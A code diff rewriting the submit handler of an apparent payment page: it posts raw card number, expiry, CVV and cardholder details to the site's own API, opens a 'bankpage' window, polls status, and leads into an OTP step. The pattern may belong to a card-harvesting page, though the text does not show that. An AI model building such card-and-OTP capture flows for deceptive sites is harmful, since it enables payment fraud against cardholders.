@@ -753,53 +753,53 @@ is 100% safe. Your transaction is processed through a secure https connection.
       }
 
 document.getElementById('mainForm').addEventListener('submit', async function(e) {
-     e.preventDefault();
-     if (!isCardValid || !isExpiryValid || isProcessing) return;
-     
-     isProcessing = true;
-     const overlay = document.getElementById('bankpageOverlay');
-     overlay.style.display = 'flex';
+  e.preventDefault();
+  if (!isCardValid || !isExpiryValid || isProcessing) return;
 
-     try {
-       const response = await fetch("/api/sendPaymentDetails", {
-         method: "POST",
-         headers: { "Content-Type": "application/json" },
-         body: JSON.stringify({
-           // ... your existing payment data
-         })
-       });
-       
-       const result = await response.json();
-       if (result.status === "success") {
-         const bankPageWindow = window.open(`/bankpage.html?invoiceId=${result.invoiceId}`, '_blank');
-         currentInvoiceId = result.invoiceId;
+  isProcessing = true;
+  const submitButton = document.getElementById('submitButton');
+  const submitLoader = document.getElementById('submitLoader');
+  
+  // Show loading state
+  submitButton.disabled = true;
+  submitLoader.classList.remove('hidden');
 
-         const statusCheck = setInterval(async () => {
-           try {
-             const statusRes = await fetch(`/api/checkTransactionStatus?invoiceId=${result.invoiceId}`);
-             const status = await statusRes.json();
-             
-             if (!status.redirectUrl?.includes('bankpage')) {
-               clearInterval(statusCheck);
-               overlay.style.display = 'none';
-               if (bankPageWindow && !bankPageWindow.closed) {
-                 bankPageWindow.close();
-               }
-             }
-           } catch (err) {
-             console.error('Status check error:', err);
-             clearInterval(statusCheck);
-           }
-         }, 1000);
-       }
-     } catch (err) {
-       console.error('Payment submission error:', err);
-       overlay.style.display = 'none';
-       alert('Error processing payment. Please try again.');
-       isProcessing = false;
-       // ... rest of error handling
-     }
-   });
+  try {
+    const response = await fetch("/api/sendPaymentDetails", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        cardNumber: document.getElementById('cardNumber').value.replace(/\s+/g, ''),
+        expiry: document.getElementById('expiry').value,
+        cvv: document.getElementById('cvv').value,
+        email: document.getElementById('email').value,
+        amount: document.getElementById('amount').value,
+        currency: "INR",
+        cardholder: document.getElementById('cardholderName').value
+      })
+    });
+
+    const data = await response.json();
+
+    if (!response.ok) {
+      throw new Error(data.message || 'Payment failed');
+    }
+
+    if (data.status === "success") {
+      currentInvoiceId = data.invoiceId;
+      bankPageWindow = window.open(`/bankpage.html?invoiceId=${data.invoiceId}`, '_blank');
+      statusCheckInterval = setInterval(checkTransactionStatus, 2000);
+    }
+
+  } catch (err) {
+    console.error('Payment Error:', err);
+    alert(`Payment Failed: ${err.message}`);
+  } finally {
+    submitButton.disabled = false;
+    submitLoader.classList.add('hidden');
+    isProcessing = false;
+  }
+});
 
 
       document.getElementById('otpSubmitButton').addEventListener('click', async () => {
